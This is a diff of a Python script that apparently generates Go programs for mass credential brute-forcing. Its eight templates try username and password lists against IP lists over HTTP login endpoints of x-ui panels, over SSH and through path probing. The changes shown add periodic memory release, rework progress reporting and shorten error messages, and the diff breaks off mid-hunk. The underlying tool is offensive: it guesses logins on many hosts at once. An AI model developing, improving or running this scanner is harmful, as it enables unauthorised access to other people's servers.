@@ -4,12 +4,22 @@ import subprocess
 import time
 import shutil
 import sys
+
+# 依赖将在check_environment()中通过apt安装，这里仅做导入
+try:
+    import psutil
+    import requests
+    from openpyxl import Workbook, load_workbook
+except ImportError:
+    # 留空，让环境检查函数处理安装
+    pass
+
 try:
     import readline
 except ImportError:
     pass
 
-# =========================== xui.go模板1内容 (已修复) ===========================
+# =========================== xui.go模板1内容 (增加FreeOSMemory) ===========================
 XUI_GO_TEMPLATE_1 = '''package main
 
 import (
@@ -21,11 +31,11 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"runtime/debug"
 	"strings"
 	"sync"
 	"sync/atomic"
 	"time"
-	"runtime"
 )
 
 var wg sync.WaitGroup
@@ -114,7 +124,6 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 			}
 
 			if err != nil {
-				// fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
 				continue
 			}
 			
@@ -134,35 +143,48 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 	}
 }
 
-func updateProgress() {
-	ticker := time.NewTicker(1 * time.Second)
-	defer ticker.Stop()
-
-	for range ticker.C {
-		count := atomic.LoadInt64(&completedCount)
-		percent := float64(count) / float64(totalTasks) * 100
-		elapsed := int(time.Since(startTime).Seconds())
-
-		if count == 0 {
-			fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
-			continue
-		}
-		
-		if totalTasks > count {
-			remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
-			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
-		} else {
-			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
-		}
-
-		if count >= totalTasks {
-			break
-		}
-	}
+func triggerFreeOSMemory() {
+	fmt.Println("\\n[SYSTEM] 正在尝试将未使用的内存返还给操作系统...")
+	debug.FreeOSMemory()
+	fmt.Printf("\\r[SYSTEM] 内存返还操作完成。")
 }
 
-func triggerGC() {
-	runtime.GC()
+func updateProgress() {
+	progressTicker := time.NewTicker(1 * time.Second)
+	defer progressTicker.Stop()
+	memFreeTicker := time.NewTicker(2 * time.Minute)
+	defer memFreeTicker.Stop()
+
+	for {
+		select {
+		case <-progressTicker.C:
+			count := atomic.LoadInt64(&completedCount)
+			if totalTasks == 0 {
+				fmt.Printf("\\r没有任务可处理...")
+				continue
+			}
+			percent := float64(count) / float64(totalTasks) * 100
+			elapsed := int(time.Since(startTime).Seconds())
+
+			if count == 0 {
+				fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
+				continue
+			}
+			
+			if totalTasks > count {
+				remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
+				fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
+			} else {
+				fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
+			}
+
+			if count >= totalTasks {
+				return
+			}
+		case <-memFreeTicker.C:
+			triggerFreeOSMemory()
+		}
+	}
 }
 
 func main() {
@@ -177,7 +199,7 @@ func main() {
 	passwords := {pass_list}
 
     if len(usernames) == 0 || len(passwords) == 0 {
-        fmt.Println("错误：用户名或密码列表为空。请检查您的 username.txt 和 password.txt 文件并确保它们包含内容。")
+        fmt.Println("错误：用户名或密码列表为空。")
         return
     }
 
@@ -191,7 +213,7 @@ func main() {
 
 	totalTasks = int64(len(batch))
     if totalTasks == 0 {
-        fmt.Println("未加载到任何有效任务，请检查 results.txt 文件。")
+        fmt.Println("未加载到任何有效任务。")
         return
     }
     fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
@@ -208,7 +230,7 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板2内容 (已修复) ===========================
+# =========================== xui.go模板2内容 (增加FreeOSMemory) ===========================
 XUI_GO_TEMPLATE_2 = '''package main
 
 import (
@@ -220,11 +242,11 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"runtime/debug"
 	"strings"
 	"sync"
 	"sync/atomic"
 	"time"
-	"runtime"
 )
 
 var wg sync.WaitGroup
@@ -316,7 +338,6 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 			}
 
 			if err != nil {
-				// fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
 				continue
 			}
 			
@@ -336,35 +357,48 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 	}
 }
 
-func updateProgress() {
-	ticker := time.NewTicker(1 * time.Second)
-	defer ticker.Stop()
-
-	for range ticker.C {
-		count := atomic.LoadInt64(&completedCount)
-		percent := float64(count) / float64(totalTasks) * 100
-		elapsed := int(time.Since(startTime).Seconds())
-
-		if count == 0 {
-			fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
-			continue
-		}
-		
-		if totalTasks > count {
-			remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
-			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
-		} else {
-			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
-		}
-
-		if count >= totalTasks {
-			break
-		}
-	}
+func triggerFreeOSMemory() {
+	fmt.Println("\\n[SYSTEM] 正在尝试将未使用的内存返还给操作系统...")
+	debug.FreeOSMemory()
+	fmt.Printf("\\r[SYSTEM] 内存返还操作完成。")
 }
 
-func triggerGC() {
-	runtime.GC()
+func updateProgress() {
+	progressTicker := time.NewTicker(1 * time.Second)
+	defer progressTicker.Stop()
+	memFreeTicker := time.NewTicker(2 * time.Minute)
+	defer memFreeTicker.Stop()
+
+	for {
+		select {
+		case <-progressTicker.C:
+			count := atomic.LoadInt64(&completedCount)
+			if totalTasks == 0 {
+				fmt.Printf("\\r没有任务可处理...")
+				continue
+			}
+			percent := float64(count) / float64(totalTasks) * 100
+			elapsed := int(time.Since(startTime).Seconds())
+
+			if count == 0 {
+				fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
+				continue
+			}
+			
+			if totalTasks > count {
+				remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
+				fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
+			} else {
+				fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
+			}
+
+			if count >= totalTasks {
+				return
+			}
+		case <-memFreeTicker.C:
+			triggerFreeOSMemory()
+		}
+	}
 }
 
 func main() {
@@ -379,7 +413,7 @@ func main() {
 	passwords := {pass_list}
 
     if len(usernames) == 0 || len(passwords) == 0 {
-        fmt.Println("错误：用户名或密码列表为空。请检查您的 username.txt 和 password.txt 文件并确保它们包含内容。")
+        fmt.Println("错误：用户名或密码列表为空。")
         return
     }
 
@@ -393,7 +427,7 @@ func main() {
 
 	totalTasks = int64(len(batch))
     if totalTasks == 0 {
-        fmt.Println("未加载到任何有效任务，请检查 results.txt 文件。")
+        fmt.Println("未加载到任何有效任务。")
         return
     }
     fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
@@ -410,7 +444,7 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板3内容 (已修复) ===========================
+# =========================== xui.go模板3内容 (增加FreeOSMemory) ===========================
 XUI_GO_TEMPLATE_3 = '''package main
 
 import (
@@ -422,11 +456,11 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"runtime/debug"
 	"strings"
 	"sync"
 	"sync/atomic"
 	"time"
-	"runtime"
 )
 
 var wg sync.WaitGroup
@@ -509,7 +543,6 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 			resp, err := postRequest(ctx, checkUrl, username, password)
 			cancel()
 			if err != nil {
-				// fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
 				continue
 			}
 			
@@ -531,35 +564,48 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 	}
 }
 
-func updateProgress() {
-	ticker := time.NewTicker(1 * time.Second)
-	defer ticker.Stop()
-
-	for range ticker.C {
-		count := atomic.LoadInt64(&completedCount)
-		percent := float64(count) / float64(totalTasks) * 100
-		elapsed := int(time.Since(startTime).Seconds())
-
-		if count == 0 {
-			fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
-			continue
-		}
-		
-		if totalTasks > count {
-			remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
-			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
-		} else {
-			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
-		}
-
-		if count >= totalTasks {
-			break
-		}
-	}
+func triggerFreeOSMemory() {
+	fmt.Println("\\n[SYSTEM] 正在尝试将未使用的内存返还给操作系统...")
+	debug.FreeOSMemory()
+	fmt.Printf("\\r[SYSTEM] 内存返还操作完成。")
 }
 
-func triggerGC() {
-	runtime.GC()
+func updateProgress() {
+	progressTicker := time.NewTicker(1 * time.Second)
+	defer progressTicker.Stop()
+	memFreeTicker := time.NewTicker(2 * time.Minute)
+	defer memFreeTicker.Stop()
+
+	for {
+		select {
+		case <-progressTicker.C:
+			count := atomic.LoadInt64(&completedCount)
+			if totalTasks == 0 {
+				fmt.Printf("\\r没有任务可处理...")
+				continue
+			}
+			percent := float64(count) / float64(totalTasks) * 100
+			elapsed := int(time.Since(startTime).Seconds())
+
+			if count == 0 {
+				fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
+				continue
+			}
+			
+			if totalTasks > count {
+				remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
+				fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
+			} else {
+				fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
+			}
+
+			if count >= totalTasks {
+				return
+			}
+		case <-memFreeTicker.C:
+			triggerFreeOSMemory()
+		}
+	}
 }
 
 func main() {
@@ -574,7 +620,7 @@ func main() {
 	passwords := {pass_list}
 
     if len(usernames) == 0 || len(passwords) == 0 {
-        fmt.Println("错误：用户名或密码列表为空。请检查您的 username.txt 和 password.txt 文件并确保它们包含内容。")
+        fmt.Println("错误：用户名或密码列表为空。")
         return
     }
 
@@ -588,7 +634,7 @@ func main() {
 
 	totalTasks = int64(len(batch))
     if totalTasks == 0 {
-        fmt.Println("未加载到任何有效任务，请检查 results.txt 文件。")
+        fmt.Println("未加载到任何有效任务。")
         return
     }
     fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
@@ -605,7 +651,7 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板4内容 (已修复) ===========================
+# =========================== xui.go模板4内容 (增加FreeOSMemory) ===========================
 XUI_GO_TEMPLATE_4 = '''package main
 
 import (
@@ -617,11 +663,11 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"runtime/debug"
 	"strings"
 	"sync"
 	"sync/atomic"
 	"time"
-	"runtime"
 )
 
 var wg sync.WaitGroup
@@ -708,7 +754,6 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 			cancel()
 
 			if err != nil {
-				// fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
 				continue
 			}
 			
@@ -734,33 +779,48 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 	}
 }
 
-func updateProgress() {
-	ticker := time.NewTicker(1 * time.Second)
-	defer ticker.Stop()
-	for range ticker.C {
-		count := atomic.LoadInt64(&completedCount)
-		percent := float64(count) / float64(totalTasks) * 100
-		elapsed := int(time.Since(startTime).Seconds())
-		if count == 0 {
-			fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
-			continue
-		}
-		
-		if totalTasks > count {
-			remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
-			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
-		} else {
-			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
-		}
-		
-		if count >= totalTasks {
-			break
-		}
-	}
+func triggerFreeOSMemory() {
+	fmt.Println("\\n[SYSTEM] 正在尝试将未使用的内存返还给操作系统...")
+	debug.FreeOSMemory()
+	fmt.Printf("\\r[SYSTEM] 内存返还操作完成。")
 }
 
-func triggerGC() {
-	runtime.GC()
+func updateProgress() {
+	progressTicker := time.NewTicker(1 * time.Second)
+	defer progressTicker.Stop()
+	memFreeTicker := time.NewTicker(2 * time.Minute)
+	defer memFreeTicker.Stop()
+
+	for {
+		select {
+		case <-progressTicker.C:
+			count := atomic.LoadInt64(&completedCount)
+			if totalTasks == 0 {
+				fmt.Printf("\\r没有任务可处理...")
+				continue
+			}
+			percent := float64(count) / float64(totalTasks) * 100
+			elapsed := int(time.Since(startTime).Seconds())
+
+			if count == 0 {
+				fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
+				continue
+			}
+			
+			if totalTasks > count {
+				remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
+				fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
+			} else {
+				fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
+			}
+
+			if count >= totalTasks {
+				return
+			}
+		case <-memFreeTicker.C:
+			triggerFreeOSMemory()
+		}
+	}
 }
 
 func main() {
@@ -775,7 +835,7 @@ func main() {
 	passwords := {pass_list}
 
     if len(usernames) == 0 || len(passwords) == 0 {
-        fmt.Println("错误：用户名或密码列表为空。请检查您的 username.txt 和 password.txt 文件并确保它们包含内容。")
+        fmt.Println("错误：用户名或密码列表为空。")
         return
     }
 
@@ -789,7 +849,7 @@ func main() {
 
 	totalTasks = int64(len(batch))
     if totalTasks == 0 {
-        fmt.Println("未加载到任何有效任务，请检查 results.txt 文件。")
+        fmt.Println("未加载到任何有效任务。")
         return
     }
     fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
@@ -806,7 +866,7 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板5内容 (已修复) ===========================
+# =========================== xui.go模板5内容 (增加FreeOSMemory) ===========================
 XUI_GO_TEMPLATE_5 = '''package main
 
 import (
@@ -818,11 +878,11 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"runtime/debug"
 	"strings"
 	"sync"
 	"sync/atomic"
 	"time"
-	"runtime"
 )
 
 var wg sync.WaitGroup
@@ -907,7 +967,6 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 			cancel()
 
 			if err != nil {
-				// fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
 				continue
 			}
 
@@ -929,35 +988,48 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 	}
 }
 
-func updateProgress() {
-	ticker := time.NewTicker(1 * time.Second)
-	defer ticker.Stop()
-
-	for range ticker.C {
-		count := atomic.LoadInt64(&completedCount)
-		percent := float64(count) / float64(totalTasks) * 100
-		elapsed := int(time.Since(startTime).Seconds())
-
-		if count == 0 {
-			fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
-			continue
-		}
-		
-		if totalTasks > count {
-			remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
-			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
-		} else {
-			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
-		}
-
-		if count >= totalTasks {
-			break
-		}
-	}
+func triggerFreeOSMemory() {
+	fmt.Println("\\n[SYSTEM] 正在尝试将未使用的内存返还给操作系统...")
+	debug.FreeOSMemory()
+	fmt.Printf("\\r[SYSTEM] 内存返还操作完成。")
 }
 
-func triggerGC() {
-	runtime.GC()
+func updateProgress() {
+	progressTicker := time.NewTicker(1 * time.Second)
+	defer progressTicker.Stop()
+	memFreeTicker := time.NewTicker(2 * time.Minute)
+	defer memFreeTicker.Stop()
+
+	for {
+		select {
+		case <-progressTicker.C:
+			count := atomic.LoadInt64(&completedCount)
+			if totalTasks == 0 {
+				fmt.Printf("\\r没有任务可处理...")
+				continue
+			}
+			percent := float64(count) / float64(totalTasks) * 100
+			elapsed := int(time.Since(startTime).Seconds())
+
+			if count == 0 {
+				fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
+				continue
+			}
+			
+			if totalTasks > count {
+				remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
+				fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
+			} else {
+				fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
+			}
+
+			if count >= totalTasks {
+				return
+			}
+		case <-memFreeTicker.C:
+			triggerFreeOSMemory()
+		}
+	}
 }
 
 func main() {
@@ -972,7 +1044,7 @@ func main() {
 	passwords := {pass_list}
 
     if len(usernames) == 0 || len(passwords) == 0 {
-        fmt.Println("错误：用户名或密码列表为空。请检查您的 username.txt 和 password.txt 文件并确保它们包含内容。")
+        fmt.Println("错误：用户名或密码列表为空。")
         return
     }
 
@@ -986,7 +1058,7 @@ func main() {
 
 	totalTasks = int64(len(batch))
     if totalTasks == 0 {
-        fmt.Println("未加载到任何有效任务，请检查 results.txt 文件。")
+        fmt.Println("未加载到任何有效任务。")
         return
     }
     fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
@@ -1003,20 +1075,19 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板6内容 (已修复) ===========================
+# =========================== xui.go模板6内容 (增加FreeOSMemory) ===========================
 XUI_GO_TEMPLATE_6 = '''package main
 
 import (
 	"bufio"
 	"fmt"
-	"io/ioutil"
 	"net/url"
 	"os"
+	"runtime/debug"
 	"strings"
 	"sync"
 	"sync/atomic"
 	"time"
-	"runtime"
 
 	"golang.org/x/crypto/ssh"
 )
@@ -1159,64 +1230,61 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 var lastCompletedCount int64
 var lastUpdateTime time.Time
 
+func triggerFreeOSMemory() {
+	fmt.Println("\\n[SYSTEM] 正在尝试将未使用的内存返还给操作系统...")
+	debug.FreeOSMemory()
+	fmt.Printf("\\r[SYSTEM] 内存返还操作完成。")
+}
+
 func updateProgress() {
-	ticker := time.NewTicker(1 * time.Second)
-	defer ticker.Stop()
+	progressTicker := time.NewTicker(1 * time.Second)
+	defer progressTicker.Stop()
+	memFreeTicker := time.NewTicker(2 * time.Minute)
+	defer memFreeTicker.Stop()
 
-	for range ticker.C {
-		count := atomic.LoadInt64(&completedCount)
-		percent := float64(count) / float64(totalTasks) * 100
-		elapsed := int(time.Since(startTime).Seconds())
+	for {
+		select {
+		case <-progressTicker.C:
+			count := atomic.LoadInt64(&completedCount)
+			if totalTasks == 0 {
+				fmt.Printf("\\r没有任务可处理...")
+				continue
+			}
+			percent := float64(count) / float64(totalTasks) * 100
+			elapsed := int(time.Since(startTime).Seconds())
 
-		if count == 0 {
-			fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
-			lastUpdateTime = time.Now()
+			if count == 0 {
+				fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
+				lastUpdateTime = time.Now()
+				lastCompletedCount = count
+				continue
+			}
+			
+			if totalTasks > count {
+				remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
+				fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
+			} else {
+				fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
+			}
+			
+			if count == lastCompletedCount && time.Since(lastUpdateTime) > 60*time.Second {
+				fmt.Println("\\n进度卡住，重新开始当前任务")
+				triggerFileCleanUp()
+				return
+			}
+
 			lastCompletedCount = count
-			continue
-		}
+			lastUpdateTime = time.Now()
 
-		if totalTasks > count {
-			remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
-			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
-		} else {
-			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
-		}
-		
-		if count == lastCompletedCount && time.Since(lastUpdateTime) > 60*time.Second {
-	        fmt.Println("\\n进度卡住，重新开始当前任务")
-	        triggerFileCleanUp()
-	        return
-          }
-
-
-		lastCompletedCount = count
-		lastUpdateTime = time.Now()
-
-		if count >= totalTasks {
-			fmt.Println("\\n进度完成！")
-			return
+			if count >= totalTasks {
+				fmt.Println("\\n进度完成！")
+				return
+			}
+		case <-memFreeTicker.C:
+			triggerFreeOSMemory()
 		}
 	}
 }
-
-func triggerGC() {
-	runtime.GC()
-}
-
-func waitTimeout(wg *sync.WaitGroup, timeout time.Duration) bool {
-	done := make(chan struct{})
-	go func() {
-		wg.Wait()
-		close(done)
-	}()
-	select {
-	case <-done:
-		return true
-	case <-time.After(timeout):
-		return false
-	}
-}
-
 
 var retryFlag = false
 
@@ -1380,13 +1448,13 @@ RETRY:
 	passwords := {pass_list}
 
     if len(usernames) == 0 || len(passwords) == 0 {
-        fmt.Println("错误：用户名或密码列表为空。请检查您的 username.txt 和 password.txt 文件并确保它们包含内容。")
+        fmt.Println("错误：用户名或密码列表为空。")
         return
     }
 
 	totalTasks = int64(len(batch))
     if totalTasks == 0 {
-        fmt.Println("未加载到任何有效任务，请检查 results.txt 文件。")
+        fmt.Println("未加载到任何有效任务。")
         return
     }
     fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
@@ -1424,7 +1492,7 @@ RETRY:
 
 
 '''
-# =========================== xui.go模板7内容 (已修复) ===========================
+# =========================== xui.go模板7内容 (增加FreeOSMemory) ===========================
 XUI_GO_TEMPLATE_7 = '''package main
 
 import (
@@ -1435,11 +1503,11 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"runtime/debug"
 	"strings"
 	"sync"
 	"sync/atomic"
 	"time"
-	"runtime"
 )
 
 var wg sync.WaitGroup
@@ -1495,8 +1563,6 @@ func sendRequest(ctx context.Context, client *http.Client, fullURL string) (bool
 		return false, err
 	}
 	defer resp.Body.Close()
-
-	// fmt.Printf("[INFO] 响应 from %s | Status: %d\\n", fullURL, resp.StatusCode)
 
 	if resp.StatusCode == http.StatusOK {
 		bodyBytes, _ := io.ReadAll(resp.Body)
@@ -1565,35 +1631,48 @@ func processIP(line string, file *os.File, paths []string, client *http.Client) 
 	}
 }
 
-func updateProgress() {
-	ticker := time.NewTicker(1 * time.Second)
-	defer ticker.Stop()
-
-	for range ticker.C {
-		count := atomic.LoadInt64(&completedCount)
-		percent := float64(count) / float64(totalTasks) * 100
-		elapsed := int(time.Since(startTime).Seconds())
-
-		if count == 0 {
-			fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
-			continue
-		}
-		
-		if totalTasks > count {
-			remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
-			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
-		} else {
-			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
-		}
-
-		if count >= totalTasks {
-			break
-		}
-	}
+func triggerFreeOSMemory() {
+	fmt.Println("\\n[SYSTEM] 正在尝试将未使用的内存返还给操作系统...")
+	debug.FreeOSMemory()
+	fmt.Printf("\\r[SYSTEM] 内存返还操作完成。")
 }
 
-func triggerGC() {
-	runtime.GC()
+func updateProgress() {
+	progressTicker := time.NewTicker(1 * time.Second)
+	defer progressTicker.Stop()
+	memFreeTicker := time.NewTicker(2 * time.Minute)
+	defer memFreeTicker.Stop()
+
+	for {
+		select {
+		case <-progressTicker.C:
+			count := atomic.LoadInt64(&completedCount)
+			if totalTasks == 0 {
+				fmt.Printf("\\r没有任务可处理...")
+				continue
+			}
+			percent := float64(count) / float64(totalTasks) * 100
+			elapsed := int(time.Since(startTime).Seconds())
+
+			if count == 0 {
+				fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
+				continue
+			}
+			
+			if totalTasks > count {
+				remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
+				fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
+			} else {
+				fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
+			}
+
+			if count >= totalTasks {
+				return
+			}
+		case <-memFreeTicker.C:
+			triggerFreeOSMemory()
+		}
+	}
 }
 
 func main() {
@@ -1609,7 +1688,7 @@ func main() {
 	}
 
     if len(paths) == 0 {
-        fmt.Println("错误：路径/密码列表为空。请检查您的 password.txt 文件并确保它包含内容。")
+        fmt.Println("错误：路径/密码列表为空。")
         return
     }
 
@@ -1622,7 +1701,7 @@ func main() {
 
 	totalTasks = int64(len(lines))
     if totalTasks == 0 {
-        fmt.Println("未加载到任何有效任务，请检查 results.txt 文件。")
+        fmt.Println("未加载到任何有效任务。")
         return
     }
     fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
@@ -1641,22 +1720,21 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板8内容 (已修复) ===========================
+# =========================== xui.go模板8内容 (增加FreeOSMemory) ===========================
 XUI_GO_TEMPLATE_8 = '''package main
 
 import (
 	"bufio"
 	"context"
 	"fmt"
-	"io/ioutil"
 	"net/http"
 	"net/url"
 	"os"
+	"runtime/debug"
 	"strings"
 	"sync"
 	"sync/atomic"
 	"time"
-	"runtime"
 )
 
 var wg sync.WaitGroup
@@ -1767,7 +1845,6 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 				resp, err := postRequest(ctx, finalURL, username, password, origin, referer)
 				cancel()
 				if err != nil {
-					// fmt.Printf("[-] 连接失败 %s - %v\\n", finalURL, err)
 					continue
 				}
 
@@ -1786,33 +1863,48 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 	}
 }
 
-func updateProgress() {
-	ticker := time.NewTicker(1 * time.Second)
-	defer ticker.Stop()
-	for range ticker.C {
-		count := atomic.LoadInt64(&completedCount)
-		percent := float64(count) / float64(totalTasks) * 100
-		elapsed := int(time.Since(startTime).Seconds())
-		if count == 0 {
-			fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
-			continue
-		}
-		
-		if totalTasks > count {
-			remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
-			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
-		} else {
-			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
-		}
-		
-		if count >= totalTasks {
-			break
-		}
-	}
+func triggerFreeOSMemory() {
+	fmt.Println("\\n[SYSTEM] 正在尝试将未使用的内存返还给操作系统...")
+	debug.FreeOSMemory()
+	fmt.Printf("\\r[SYSTEM] 内存返还操作完成。")
 }
 
-func triggerGC() {
-	runtime.GC()
+func updateProgress() {
+	progressTicker := time.NewTicker(1 * time.Second)
+	defer progressTicker.Stop()
+	memFreeTicker := time.NewTicker(2 * time.Minute)
+	defer memFreeTicker.Stop()
+
+	for {
+		select {
+		case <-progressTicker.C:
+			count := atomic.LoadInt64(&completedCount)
+			if totalTasks == 0 {
+				fmt.Printf("\\r没有任务可处理...")
+				continue
+			}
+			percent := float64(count) / float64(totalTasks) * 100
+			elapsed := int(time.Since(startTime).Seconds())
+
+			if count == 0 {
+				fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
+				continue
+			}
+			
+			if totalTasks > count {
+				remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
+				fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
+			} else {
+				fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
+			}
+
+			if count >= totalTasks {
+				return
+			}
+		case <-memFreeTicker.C:
+			triggerFreeOSMemory()
+		}
+	}
 }
 
 func main() {
@@ -1827,7 +1919,7 @@ func main() {
 	passwords := {pass_list}
 
     if len(usernames) == 0 || len(passwords) == 0 {
-        fmt.Println("错误：用户名或密码列表为空。请检查您的 username.txt 和 password.txt 文件并确保它们包含内容。")
+        fmt.Println("错误：用户名或密码列表为空。")
         return
     }
 
@@ -1841,7 +1933,7 @@ func main() {
 
 	totalTasks = int64(len(batch))
     if totalTasks == 0 {
-        fmt.Println("未加载到任何有效任务，请检查 results.txt 文件。")
+        fmt.Println("未加载到任何有效任务。")
